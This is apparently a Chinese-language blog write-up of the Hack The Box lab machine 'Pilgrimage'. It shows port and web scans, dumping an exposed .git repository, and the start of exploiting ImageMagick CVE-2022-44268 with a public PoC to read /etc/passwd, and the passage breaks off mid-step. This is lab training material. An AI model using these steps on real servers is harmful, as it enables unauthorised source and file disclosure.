<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[HTB]  Pilgrimage | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HTB]  Pilgrimage</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-07-12T07:56:07.768Z" id="date"> 2023-07-12</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-07-12T10:20:29.646Z" id="updated"> 2023-07-12</time></div></span><br><span>Word Count: <div class="control">5.1k</div></span><br><span>Read Time: <div class="control">26 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/gf.jpg'><img src="/pic/gf.jpg" alt="girls_frontline"></p>
<span id="more"></span>



<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然是HTB上easy难度的靶机，其实还是要有点难度的。主打的就是一个信息收集能力以及经验。值得尝试。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/HTB/Pilgrimage]<br>└─$ sudo nmap -p- --min-rate=10000 10.10.11.219                              <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 16:02 CST<br>Nmap scan report <span class="hljs-keyword">for</span> pilgrimage.htb (10.10.11.219)<br>Host is up (0.27s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.24 seconds<br>                                                                                             <br>┌──(kali㉿kali)-[~/HTB/Pilgrimage]<br>└─$ sudo nmap -sV -sT -O -p22,80 10.10.11.219  <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 16:07 CST<br>Nmap scan report <span class="hljs-keyword">for</span> pilgrimage.htb (10.10.11.219)<br>Host is up (0.26s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)<br>80/tcp open  http    nginx 1.18.0<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 5.0 (96%), Linux 5.0 - 5.3 (95%), Linux 4.15 - 5.6 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 2 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 24.96 seconds<br><br>┌──(kali㉿kali)-[~/HTB/Pilgrimage]<br>└─$ sudo nmap --script=vuln 10.10.11.219       <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 16:08 CST<br>Stats: 0:06:37 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan<br>NSE Timing: About 98.52% <span class="hljs-keyword">done</span>; ETC: 16:15 (0:00:05 remaining)<br>Stats: 0:13:02 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan<br>NSE Timing: About 99.01% <span class="hljs-keyword">done</span>; ETC: 16:22 (0:00:07 remaining)<br>Nmap scan report <span class="hljs-keyword">for</span> pilgrimage.htb (10.10.11.219)<br>Host is up (0.26s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>| http-git: <br>|   10.10.11.219:80/.git/<br>|     Git repository found!<br>|     Repository description: Unnamed repository; edit this file <span class="hljs-string">&#x27;description&#x27;</span> to name the...<br>|_    Last commit message: Pilgrimage image shrinking service initial commit. <span class="hljs-comment"># Please ...</span><br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-fileupload-exploiter: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">| http-csrf: </span><br><span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=pilgrimage.htb</span><br><span class="hljs-string">|   Found the following possible CSRF vulnerabilities: </span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://pilgrimage.htb:80/</span><br><span class="hljs-string">|     Form id: filename</span><br><span class="hljs-string">|     Form action: /</span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://pilgrimage.htb:80/dashboard.php</span><br><span class="hljs-string">|     Form id: </span><br><span class="hljs-string">|     Form action: /login.php</span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://pilgrimage.htb:80/register.php</span><br><span class="hljs-string">|     Form id: </span><br><span class="hljs-string">|     Form action: /register.php</span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://pilgrimage.htb:80/login.php</span><br><span class="hljs-string">|     Form id: </span><br><span class="hljs-string">|_    Form action: /login.php</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>| http-enum: <br>|   /login.php: Possible admin folder<br>|_  /.git/HEAD: Git folder<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 1021.09 seconds<br></code></pre></td></tr></table></figure>

<p>省流一下就是发现80和22端口开着，且网站的Git仓库没删。git信息收集这块是我们接下来肯定要考虑的步骤。</p>
<h3 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/HTB/Pilgrimage]<br>└─$ sudo whatweb http://10.10.11.219<br>http://10.10.11.219 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.219], RedirectLocation[http://pilgrimage.htb/], Title[301 Moved Permanently], nginx[1.18.0]<br>http://pilgrimage.htb/ [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.219], JQuery, Script, Title[Pilgrimage - Shrink Your Images], nginx[1.18.0]<br></code></pre></td></tr></table></figure>

<p>whatweb第一次扫的时候显示跳转，所以我们去hosts里把跳转地址<a target="_blank" rel="noopener" href="http://pilgrimage.htb/%E7%BB%99%E5%8A%A0%E4%B8%8A%E3%80%82%E7%BD%91%E7%AB%99%E5%A4%A7%E8%87%B4%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A0%88%E6%88%91%E4%BB%AC%E4%B9%9F%E4%BA%86%E8%A7%A3%E4%BA%86%E3%80%82">http://pilgrimage.htb/给加上。网站大致的技术栈我们也了解了。</a></p>
<h3 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/HTB/Pilgrimage]<br>└─$ sudo nikto -h http://pilgrimage.htb    <br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          10.10.11.219<br>+ Target Hostname:    pilgrimage.htb<br>+ Target Port:        80<br>+ Start Time:         2023-07-11 15:20:56 (GMT8)<br>---------------------------------------------------------------------------<br>+ Server: nginx/1.18.0<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies<br>+ No CGI Directories found (use <span class="hljs-string">&#x27;-C all&#x27;</span> to force check all possible <span class="hljs-built_in">dirs</span>)<br>+ /login.php: Admin login page/section found.<br>+ /.git/index: Git Index file may contain directory listing information.<br>+ /.git/HEAD: Git HEAD file found. Full repo details may be present.<br>+ /.git/config: Git config file found. Infos about repo details may be present.<br>+ /<span class="hljs-comment">#wp-config.php#: #wp-config.php# file found. This file contains the credentials.</span><br>+ 7973 requests: 6 error(s) and 8 item(s) reported on remote host<br>+ End Time:           2023-07-11 16:18:44 (GMT8) (3468 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure>

<p>因为有延迟的问题，可能会扫的很慢。但是好消息是还是给我们带来了有用信息：这一堆<code>.git</code>目录下的文件告诉我们网站所有者将网页服务上线时没把<code>.git</code>文件夹给删掉，这很可能导致源代码泄露，那我们之后就用工具给他下载下来看看。</p>
<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><h3 id="手动访问网站"><a href="#手动访问网站" class="headerlink" title="手动访问网站"></a>手动访问网站</h3><p>既然nmap扫出了80端口的web网站，我们先登上去看看网站是啥情况。</p>
<p class='item-img' data-src='/pic/assets/19ee949fabd6903663fdc1d65567b9c1.png'><img src="/pic/assets/19ee949fabd6903663fdc1d65567b9c1.png" alt="19ee949fabd6903663fdc1d65567b9c1"></p>
<p>网站实现的内容就是一个上传图片然后网页给你压缩并返回结果图片的链接。登录和注册页面没啥用，不涉及什么后台管理员登录页面。</p>
<p>了解了网站提供的服务，那他是怎么实现的呢？我们先google一下pilgrimage是不是一个通用的服务，发现并不是。那手动网页遍历就暂时没啥信息了，先回到之前我们发现的<code>.git源码泄露</code>这条路看看走不走得通吧。</p>
<h3 id="git源码泄露"><a href="#git源码泄露" class="headerlink" title=".git源码泄露"></a>.git源码泄露</h3><p>我们直接使用<a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">GitHack</a>这个工具对网站的git文件进行一个提取。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/HTB/Pilgrimage]<br>└─$ python3 ~/Tools/GitHack-master/GitHack.py http://pilgrimage.htb/.git<br>[+] Download and parse index file ...<br>[+] assets/bulletproof.php<br>[+] assets/css/animate.css<br>[+] assets/css/custom.css<br>[+] assets/css/flex-slider.css<br>[+] assets/css/fontawesome.css<br>[+] assets/css/owl.css<br>[+] assets/css/templatemo-woox-travel.css<br>[+] assets/images/banner-04.jpg<br>[+] assets/images/cta-bg.jpg<br>[+] assets/js/custom.js<br>[+] assets/js/isotope.js<br>[+] assets/js/isotope.min.js<br>[+] assets/js/owl-carousel.js<br>[+] assets/js/popup.js<br>[+] assets/js/tabs.js<br>[+] assets/webfonts/fa-brands-400.ttf<br>[+] assets/webfonts/fa-brands-400.woff2<br>[+] assets/webfonts/fa-regular-400.ttf<br>[+] assets/webfonts/fa-regular-400.woff2<br>[+] assets/webfonts/fa-solid-900.ttf<br>[+] assets/webfonts/fa-solid-900.woff2<br>[+] assets/webfonts/fa-v4compatibility.ttf<br>[+] assets/webfonts/fa-v4compatibility.woff2<br>[+] dashboard.php<br>[+] index.php<br>[+] login.php<br>[+] logout.php<br>[+] magick<br>[+] register.php<br>[+] vendor/bootstrap/css/bootstrap.min.css<br>[+] vendor/bootstrap/js/bootstrap.min.js<br>[+] vendor/jquery/jquery.js<br>[+] vendor/jquery/jquery.min.js<br>[+] vendor/jquery/jquery.min.map<br>[+] vendor/jquery/jquery.slim.js<br>[+] vendor/jquery/jquery.slim.min.js<br>[+] vendor/jquery/jquery.slim.min.map<br>[OK] assets/bulletproof.php<br>[OK] assets/css/custom.css<br>[OK] assets/css/flex-slider.css<br>[OK] assets/css/owl.css<br>[OK] assets/js/custom.js<br>[OK] assets/css/fontawesome.css<br>[OK] assets/images/cta-bg.jpg<br>[OK] assets/js/popup.js<br>[OK] assets/css/templatemo-woox-travel.css<br>[OK] assets/js/isotope.min.js<br>[OK] assets/js/isotope.js<br>[OK] assets/webfonts/fa-regular-400.woff2<br>[OK] assets/webfonts/fa-regular-400.ttf<br>[OK] assets/js/owl-carousel.js<br>[OK] assets/css/animate.css<br>[OK] dashboard.php<br>[OK] assets/webfonts/fa-v4compatibility.woff2<br>[OK] assets/webfonts/fa-v4compatibility.ttf<br>[OK] index.php<br>[OK] logout.php<br>[OK] login.php<br>[OK] assets/webfonts/fa-brands-400.woff2<br>[OK] register.php<br>[OK] vendor/bootstrap/css/bootstrap.min.css<br>[OK] vendor/bootstrap/js/bootstrap.min.js<br>[OK] vendor/jquery/jquery.min.js<br>[OK] assets/webfonts/fa-brands-400.ttf<br>[OK] assets/webfonts/fa-solid-900.woff2<br>[OK] vendor/jquery/jquery.slim.min.js<br>[OK] vendor/jquery/jquery.slim.min.map<br>[OK] vendor/jquery/jquery.js<br>[OK] vendor/jquery/jquery.min.map<br>[OK] assets/webfonts/fa-solid-900.ttf<br>[OK] vendor/jquery/jquery.slim.js<br>[OK] assets/js/tabs.js<br>[OK] assets/images/banner-04.jpg<br>[OK] magick                                                                                                          <br></code></pre></td></tr></table></figure>

<p>还是因为vpn连接的问题，下的好慢……不过好歹下载下来了，看看内容。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/HTB/Pilgrimage/pilgrimage.htb]<br>└─$ ll<br>total 26960<br>drwxr-xr-x 6 kali kali     4096 Jul 11 17:48 assets<br>-rw-r--r-- 1 kali kali     5538 Jul 11 17:48 dashboard.php<br>-rw-r--r-- 1 kali kali     9250 Jul 11 17:48 index.php<br>-rw-r--r-- 1 kali kali     6822 Jul 11 17:48 login.php<br>-rw-r--r-- 1 kali kali       98 Jul 11 17:48 logout.php<br>-rw-r--r-- 1 kali kali 27555008 Jul 11 18:35 magick<br>-rw-r--r-- 1 kali kali     6836 Jul 11 17:48 register.php<br>drwxr-xr-x 4 kali kali     4096 Jul 11 17:48 vendor<br></code></pre></td></tr></table></figure>

<p>这么多文件，我们首先要看什么呢？当然是index.php了。因为我们想搞清楚网站图片压缩服务是怎么实现的，看看它的实现是否存在漏洞可以利用。所以我们肯定要先看这个</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash">             &lt;?php<br>session_start();<br>require_once <span class="hljs-string">&quot;assets/bulletproof.php&quot;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">isAuthenticated</span></span>() &#123;<br>  <span class="hljs-built_in">return</span> json_encode(isset(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]));<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">returnUsername</span></span>() &#123;<br>  <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;\&quot;&quot;</span> . <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] . <span class="hljs-string">&quot;\&quot;&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>  <span class="hljs-variable">$image</span> = new Bulletproof\Image(<span class="hljs-variable">$_FILES</span>);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$image</span>[<span class="hljs-string">&quot;toConvert&quot;</span>]) &#123;<br>    <span class="hljs-variable">$image</span>-&gt;setLocation(<span class="hljs-string">&quot;/var/www/pilgrimage.htb/tmp&quot;</span>);<br>    <span class="hljs-variable">$image</span>-&gt;setSize(100, 4000000);<br>    <span class="hljs-variable">$image</span>-&gt;setMime(array(<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;jpeg&#x27;</span>));<br>    <span class="hljs-variable">$upload</span> = <span class="hljs-variable">$image</span>-&gt;upload();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$upload</span>) &#123;<br>      <span class="hljs-variable">$mime</span> = <span class="hljs-string">&quot;.png&quot;</span>;<br>      <span class="hljs-variable">$imagePath</span> = <span class="hljs-variable">$upload</span>-&gt;getFullPath();<br>      <span class="hljs-keyword">if</span>(mime_content_type(<span class="hljs-variable">$imagePath</span>) === <span class="hljs-string">&quot;image/jpeg&quot;</span>) &#123;<br>        <span class="hljs-variable">$mime</span> = <span class="hljs-string">&quot;.jpeg&quot;</span>;<br>      &#125;<br>      <span class="hljs-variable">$newname</span> = uniqid();<br>      <span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/&quot;</span> . <span class="hljs-variable">$upload</span>-&gt;getName() . <span class="hljs-variable">$mime</span> . <span class="hljs-string">&quot; -resize 50% /var/www/pilgrimage.htb/shrunk/&quot;</span> . <span class="hljs-variable">$newname</span> . <span class="hljs-variable">$mime</span>);<br>      <span class="hljs-built_in">unlink</span>(<span class="hljs-variable">$upload</span>-&gt;getFullPath());<br>      <span class="hljs-variable">$upload_path</span> = <span class="hljs-string">&quot;http://pilgrimage.htb/shrunk/&quot;</span> . <span class="hljs-variable">$newname</span> . <span class="hljs-variable">$mime</span>;<br>      <span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$db</span> = new PDO(<span class="hljs-string">&#x27;sqlite:/var/db/pilgrimage&#x27;</span>);<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$db</span>-&gt;prepare(<span class="hljs-string">&quot;INSERT INTO `images` (url,original,username) VALUES (?,?,?)&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;execute(array(<span class="hljs-variable">$upload_path</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;toConvert&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>],<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]));<br>      &#125;<br>      header(<span class="hljs-string">&quot;Location: /?message=&quot;</span> . <span class="hljs-variable">$upload_path</span> . <span class="hljs-string">&quot;&amp;status=success&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>      header(<span class="hljs-string">&quot;Location: /?message=Image shrink failed&amp;status=fail&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    header(<span class="hljs-string">&quot;Location: /?message=Image shrink failed&amp;status=fail&quot;</span>);<br>  &#125;<br>&#125;<br><br>?&gt;<br><br></code></pre></td></tr></table></figure>

<p>文件开头就清晰的告诉了我们：<code>exec(&quot;/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/&quot; . $upload-&gt;getName() . $mime . &quot; -resize 50% /var/www/pilgrimage.htb/shrunk/&quot; . $newname . $mime);</code>，网站服务用的是<code>magick</code>将图片缩小一半。刚好<code>magick</code>被我们下载下来了，我们直接看看<code>magick</code>的版本。</p>
<p>此外，除了使用的服务，它还贴心的告诉我们网站连接的数据的位置<code>$db = new PDO(&#39;sqlite:/var/db/pilgrimage&#39;);</code>。那我们之后肯定要想办法看看，说不定能获得用户的复用的登录凭证。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/HTB/Pilgrimage/pilgrimage.htb]<br>└─$ ./magick -version<br>Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org<br>Copyright: (C) 1999 ImageMagick Studio LLC<br>License: https://imagemagick.org/script/license.php<br>Features: Cipher DPC HDRI OpenMP(4.5) <br>Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib<br>Compiler: gcc (7.5)<br></code></pre></td></tr></table></figure>

<p>我们可以看到版本是<code>ImageMagick 7.1.0-49</code>，在exp-db搜一下是不是有可用的漏洞。发现确实有<a target="_blank" rel="noopener" href="https://github.com/voidz0r/CVE-2022-44268%E3%80%82">https://github.com/voidz0r/CVE-2022-44268。</a></p>
<h3 id="Magick任意文件读取漏洞"><a href="#Magick任意文件读取漏洞" class="headerlink" title="Magick任意文件读取漏洞"></a>Magick任意文件读取漏洞</h3><h4 id="验证PoC"><a href="#验证PoC" class="headerlink" title="验证PoC"></a>验证PoC</h4><p>此版本的magick存在任意文件读取的漏洞，PoC也介绍的很详细，我们尝试复现一下看看能不能成功利用这个PoC。</p>
<ol>
<li><p><code>git clone https://github.com/voidz0r/CVE-2022-44268</code></p>
</li>
<li><p><code>cargo run &quot;/etc/passwd&quot;</code></p>
</li>
<li><p>此时会生成一张图片，我们直接把这张图片上传到目标网站，并把返回的图片下载下来。</p>
</li>
